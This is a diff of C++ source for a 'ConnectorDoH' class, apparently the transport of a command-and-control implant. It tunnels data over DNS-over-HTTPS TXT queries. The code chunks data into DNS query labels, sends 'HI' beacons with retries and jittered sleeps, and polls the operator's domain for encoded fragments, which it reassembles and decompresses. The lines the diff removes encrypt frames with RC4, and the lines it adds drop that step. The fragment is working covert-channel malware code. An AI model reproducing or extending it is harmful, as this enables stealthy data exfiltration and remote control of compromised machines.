-        const ULONG maxUploadSize = 4 << 20; 
-        if (total > maxUploadSize) total = maxUploadSize;
+		// Enforce QNAME length safety via maxSafeFrame
+		const ULONG maxSafeFrame = 60;
+		if (maxChunk + headerSize > maxSafeFrame)
+			maxChunk = maxSafeFrame - headerSize;
 
-        ULONG seqForSend = ++this->seq;
-        ULONG offset = 0;
-        while (offset < total) {
-            ULONG chunk = total - offset;
-            if (chunk > maxChunk) chunk = maxChunk;
+		// Upper bound to avoid excessive memory use
+		const ULONG maxUploadSize = 4u << 20; // 4MB
+		if (total > maxUploadSize)
+			total = maxUploadSize;
 
-            ULONG frameSize = headerSize + chunk;
-            BYTE* frame = (BYTE*)MemAllocLocal(frameSize);
-            
-            frame[0] = (BYTE)((total >> 24) & 0xFF);
-            frame[1] = (BYTE)((total >> 16) & 0xFF);
-            frame[2] = (BYTE)((total >> 8) & 0xFF);
-            frame[3] = (BYTE)((total >> 0) & 0xFF);
-            frame[4] = (BYTE)((offset >> 24) & 0xFF);
-            frame[5] = (BYTE)((offset >> 16) & 0xFF);
-            frame[6] = (BYTE)((offset >> 8) & 0xFF);
-            frame[7] = (BYTE)((offset >> 0) & 0xFF);
-            memcpy(frame + headerSize, data + offset, chunk);
+		ULONG seqForSend = ++this->seq;
+		ULONG offset = 0;
+		while (offset < total) {
+			ULONG chunk = total - offset;
+			if (chunk > maxChunk)
+				chunk = maxChunk;
 
-            EncryptRC4(frame, frameSize, this->encryptKey, 16);
+			ULONG frameSize = headerSize + chunk;
+			BYTE* frame = (BYTE*)MemAllocLocal(frameSize);
+			if (!frame)
+				return;
 
-            memset(dataLabel, 0, sizeof(dataLabel));
-            BuildDataLabelsFromBytes(frame, frameSize, this->labelSize, dataLabel, sizeof(dataLabel));
-            MemFreeLocal((LPVOID*)&frame, frameSize);
+			// total_len (big-endian)
+			frame[0] = (BYTE)((total >> 24) & 0xFF);
+			frame[1] = (BYTE)((total >> 16) & 0xFF);
+			frame[2] = (BYTE)((total >> 8) & 0xFF);
+			frame[3] = (BYTE)((total >> 0) & 0xFF);
+			// offset (big-endian)
+			frame[4] = (BYTE)((offset >> 24) & 0xFF);
+			frame[5] = (BYTE)((offset >> 16) & 0xFF);
+			frame[6] = (BYTE)((offset >> 8) & 0xFF);
+			frame[7] = (BYTE)((offset >> 0) & 0xFF);
+			memcpy(frame + headerSize, data + offset, chunk);
 
-            BuildQName(this->sid, "cdn", seqForSend, this->idx, dataLabel, this->domain, qname, sizeof(qname));
-            
-            BYTE tmp[512];
-            ULONG tmpSize = 0;
-            DohQueryTxt(qname, tmp, sizeof(tmp), &tmpSize);
+			memset(dataLabel, 0, sizeof(dataLabel));
+			if (!BuildDataLabelsFromBytes(frame, frameSize, this->labelSize, dataLabel, sizeof(dataLabel))) {
+				MemFreeLocal((LPVOID*)&frame, frameSize);
+				return;
+			}
+			MemFreeLocal((LPVOID*)&frame, frameSize);
 
-            ApiWin->Sleep(10 + (GetTickCount() % 15));
-            offset += chunk;
-        }
-        this->lastUpTotal = total;
-        return;
-    }
+			BuildQName(this->sid, "cdn", seqForSend, this->idx, dataLabel, this->domain, qname, sizeof(qname));
+			BYTE tmp[512];
+			ULONG tmpSize = 0;
+			DohQueryTxt(qname, tmp, sizeof(tmp), &tmpSize);
 
-    // 3. Polling (GET) / Smart HI
-    if (!this->hiSent && this->hiBeat && this->hiBeatSize && this->hiRetries > 0) {
-        // Retry HI
-        ULONG maxBuf = pkt;
-        ULONG retrySize = this->hiBeatSize;
-        if (retrySize > maxBuf) retrySize = maxBuf;
-        
-        BYTE* encBuf = (BYTE*)MemAllocLocal(retrySize);
-        memcpy(encBuf, this->hiBeat, retrySize);
-        // Same as initial HI: encrypt before encoding into QNAME so that
-        // server-side RC4 decrypt yields the original beat.
-        EncryptRC4(encBuf, retrySize, this->encryptKey, 16);
-        
-        memset(dataLabel, 0, sizeof(dataLabel));
-        BuildDataLabelsFromBytes(encBuf, retrySize, this->labelSize, dataLabel, sizeof(dataLabel));
-        MemFreeLocal((LPVOID*)&encBuf, retrySize);
+			// Pacing: similar to DNS transport, keep QPS in a safe range.
+			ULONG pacing = 25 + (GetTickCount() % 15);
+			ApiWin->Sleep(pacing);
 
-        BuildQName(this->sid, "www", this->seq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
-        
-        BYTE tmp[512];
-        ULONG tmpSize = 0;
-        if (DohQueryTxt(qname, tmp, sizeof(tmp), &tmpSize)) {
-            this->hiSent = TRUE;
-        } else {
-            if (this->hiRetries > 0) this->hiRetries--;
-        }
-        return;
-    }
+			offset += chunk;
+		}
+		this->lastUpTotal = total;
+		return;
+	}
 
-    // Standard GET
-    BuildQName(this->sid, "api", ++this->seq, this->idx, "", this->domain, qname, sizeof(qname));
-    
-    BYTE respBuf[1024];
-    ULONG respSize = 0;
-    
-    if (DohQueryTxt(qname, respBuf, sizeof(respBuf), &respSize) && respSize > 0) {
-        if (respSize == 2 && respBuf[0] == 'O' && respBuf[1] == 'K') return;
+	// -------------------------------------------------------------------------
+	// 3. HI retry path when no explicit data is provided
+	// -------------------------------------------------------------------------
+	if (!this->hiSent && this->hiBeat && this->hiBeatSize && this->hiRetries > 0) {
+		ULONG maxBuf = pkt;
+		ULONG retrySize = this->hiBeatSize;
+		if (retrySize > maxBuf)
+			retrySize = maxBuf;
+		BYTE* encBuf = (BYTE*)MemAllocLocal(retrySize);
+		if (!encBuf)
+			return;
+		memcpy(encBuf, this->hiBeat, retrySize);
+		memset(dataLabel, 0, sizeof(dataLabel));
+		if (!BuildDataLabelsFromBytes(encBuf, retrySize, this->labelSize, dataLabel, sizeof(dataLabel))) {
+			MemFreeLocal((LPVOID*)&encBuf, retrySize);
+			return;
+		}
+		MemFreeLocal((LPVOID*)&encBuf, retrySize);
 
-        BYTE binBuf[1024];
-        int binLen = Base64Decode((const CHAR*)respBuf, respSize, binBuf, sizeof(binBuf));
-        if (binLen <= 0) return;
+		BuildQName(this->sid, "www", this->seq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
+		BYTE tmp[512];
+		ULONG tmpSize = 0;
+		if (DohQueryTxt(qname, tmp, sizeof(tmp), &tmpSize)) {
+			this->hiSent = TRUE;
+		}
+		else if (this->hiRetries > 0) {
+			this->hiRetries--;
+		}
+		return;
+	}
 
-        const ULONG headerSize = 8;
-        if (binLen > headerSize) {
-            ULONG total = 0;
-            ULONG offset = 0;
-            total |= ((ULONG)binBuf[0] << 24);
-            total |= ((ULONG)binBuf[1] << 16);
-            total |= ((ULONG)binBuf[2] << 8);
-            total |= ((ULONG)binBuf[3] << 0);
-            offset |= ((ULONG)binBuf[4] << 24);
-            offset |= ((ULONG)binBuf[5] << 16);
-            offset |= ((ULONG)binBuf[6] << 8);
-            offset |= ((ULONG)binBuf[7] << 0);
-            ULONG chunkLen = binLen - headerSize;
-            
-            if (total > 0 && total <= (4 << 20) && offset < total) {
-                if (!this->downBuf || this->downTotal != total) {
-                    if (this->downBuf) MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
-                    this->downBuf = (BYTE*)MemAllocLocal(total);
-                    if (!this->downBuf) {
-                        this->downTotal = 0;
-                        this->downFilled = 0;
-                        return;
-                    }
-                    this->downTotal = total;
-                    this->downFilled = 0;
-                }
+	// -------------------------------------------------------------------------
+	// 4. Normal GET: pull downlink fragments and reassemble into downBuf,
+	//    then expose completed buffer via RecvData/RecvSize.
+	// -------------------------------------------------------------------------
+	BuildQName(this->sid, "api", ++this->seq, this->idx, "", this->domain, qname, sizeof(qname));
+	BYTE respBuf[1024];
+	ULONG respSize = 0;
+	if (DohQueryTxt(qname, respBuf, sizeof(respBuf), &respSize) && respSize > 0) {
+		// Simple ACK path
+		if (respSize == 2 && respBuf[0] == 'O' && respBuf[1] == 'K') {
+			return;
+		}
 
-                // Hard reset on re-send
-                if (offset == 0 && this->downFilled > 0) {
-                     if (this->downBuf) MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
-                     this->downBuf = (BYTE*)MemAllocLocal(total);
-                     if (!this->downBuf) return;
-                     this->downTotal = total;
-                     this->downFilled = 0;
-                }
+		// Base64 decode the TXT response into binary chunk
+		BYTE binBuf[1024];
+		int binLen = Base64Decode((const CHAR*)respBuf, (int)respSize, binBuf, (int)sizeof(binBuf));
+		if (binLen <= 0) {
+			return; // invalid or empty payload
+		}
 
-                ULONG end = offset + chunkLen;
-                if (end > total) end = total;
-                ULONG n = end - offset;
-                memcpy(this->downBuf + offset, binBuf + headerSize, n);
-                this->downFilled += n;
+		const ULONG headerSize = 8;
+		// New protocol: [total_len][offset] header in big-endian
+		if (binLen > (int)headerSize) {
+			ULONG total = 0;
+			ULONG offset = 0;
+			total |= ((ULONG)binBuf[0] << 24);
+			total |= ((ULONG)binBuf[1] << 16);
+			total |= ((ULONG)binBuf[2] << 8);
+			total |= ((ULONG)binBuf[3] << 0);
+			offset |= ((ULONG)binBuf[4] << 24);
+			offset |= ((ULONG)binBuf[5] << 16);
+			offset |= ((ULONG)binBuf[6] << 8);
+			offset |= ((ULONG)binBuf[7] << 0);
+			ULONG chunkLen = (ULONG)(binLen - (int)headerSize);
+			const ULONG maxDownloadSize = 4u << 20; // 4MB
+			if (total > 0 && total <= maxDownloadSize && offset < total) {
+				if (!this->downBuf || this->downTotal != total) {
+					if (this->downBuf && this->downTotal) {
+						MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
+					}
+					this->downBuf = (BYTE*)MemAllocLocal(total);
+					if (!this->downBuf) {
+						this->downTotal = 0;
+						this->downFilled = 0;
+						return;
+					}
+					this->downTotal = total;
+					this->downFilled = 0;
+				}
 
-                if (this->downFilled >= this->downTotal) {
-                    BYTE* finalBuf = this->downBuf;
-                    ULONG finalSize = this->downTotal;
+				// If we receive offset 0 but already have some data, reset buffer
+				if (offset == 0 && this->downFilled > 0) {
+					if (this->downBuf && this->downTotal) {
+						MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
+					}
+					this->downBuf = (BYTE*)MemAllocLocal(total);
+					if (!this->downBuf) {
+						this->downTotal = 0;
+						this->downFilled = 0;
+						return;
+					}
+					this->downTotal = total;
+					this->downFilled = 0;
+				}
 
-                    if (this->downTotal > 5) {
-                         BYTE flags = this->downBuf[0];
-                         ULONG orig = 0;
-                         orig |= (ULONG)this->downBuf[1];
-                         orig |= ((ULONG)this->downBuf[2] << 8);
-                         orig |= ((ULONG)this->downBuf[3] << 16);
-                         orig |= ((ULONG)this->downBuf[4] << 24);
+				ULONG end = offset + chunkLen;
+				if (end > total)
+					end = total;
+				ULONG n = end - offset;
+				memcpy(this->downBuf + offset, binBuf + headerSize, n);
+				this->downFilled += n;
+				if (this->downFilled >= this->downTotal) {
+					// Session header: [flags][orig_len_le], followed by payload
+					BYTE* finalBuf = this->downBuf;
+					ULONG finalSize = this->downTotal;
+					if (this->downTotal > 5) {
+						BYTE flags = this->downBuf[0];
+						ULONG orig = 0;
+						orig |= (ULONG)this->downBuf[1];
+						orig |= ((ULONG)this->downBuf[2] << 8);
+						orig |= ((ULONG)this->downBuf[3] << 16);
+						orig |= ((ULONG)this->downBuf[4] << 24);
 
-                         if ((flags & 0x1) && orig > 0 && orig <= (4u << 20)) {
-                             BYTE* outBuf = NULL;
-                             if (DeflateDecompress(this->downBuf + 5, this->downTotal - 5, &outBuf, orig) && outBuf) {
-                                 finalBuf = outBuf;
-                                 finalSize = orig;
-                                 MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
-                                 this->downBuf = NULL;
-                             }
-                         } else if (flags == 0 && orig > 0 && orig <= this->downTotal - 5) {
-                             BYTE* outBuf = (BYTE*)MemAllocLocal(orig);
-                             if (outBuf) {
-                                 memcpy(outBuf, this->downBuf + 5, orig);
-                                 finalBuf = outBuf;
-                                 finalSize = orig;
-                                 MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
-                                 this->downBuf = NULL;
-                             }
-                         }
-                    }
+						if ((flags & 0x1) && orig > 0 && orig <= (4u << 20)) {
+							BYTE* outBuf = NULL;
+							if (DeflateDecompress(this->downBuf + 5, this->downTotal - 5, &outBuf, orig) && outBuf) {
+								finalBuf = outBuf;
+								finalSize = orig;
+								MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
+								this->downBuf = NULL;
+							}
+						}
+						else if (flags == 0 && orig > 0 && orig <= this->downTotal - 5) {
+							BYTE* outBuf = (BYTE*)MemAllocLocal(orig);
+							if (outBuf) {
+								memcpy(outBuf, this->downBuf + 5, orig);
+								finalBuf = outBuf;
+								finalSize = orig;
+								MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
+								this->downBuf = NULL;
+							}
+						}
+					}
 
-                    this->recvData = finalBuf;
-                    this->recvSize = (int)finalSize;
-                    this->lastDownTotal = finalSize;
-                    this->downBuf = NULL;
-                    this->downTotal = 0;
-                    this->downFilled = 0;
-                }
-                return;
-            }
-        }
-        
-        this->recvData = (BYTE*)MemAllocLocal(binLen);
-        memcpy(this->recvData, binBuf, binLen);
-        this->recvSize = binLen;
-    }
+					this->recvData = finalBuf;
+					this->recvSize = (int)finalSize;
+					this->lastDownTotal = finalSize;
+					this->downBuf = NULL;
+					this->downTotal = 0;
+					this->downFilled = 0;
+				}
+				return;
+			}
+		}
+
+		// Legacy path: no header, treat as single complete buffer
+		this->recvData = (BYTE*)MemAllocLocal(binLen);
+		if (!this->recvData)
+			return;
+		memcpy(this->recvData, binBuf, binLen);
+		this->recvSize = binLen;
+		this->lastDownTotal = (ULONG)binLen;
+	}
 }
 
 BYTE* ConnectorDoH::RecvData() { return this->recvData; }
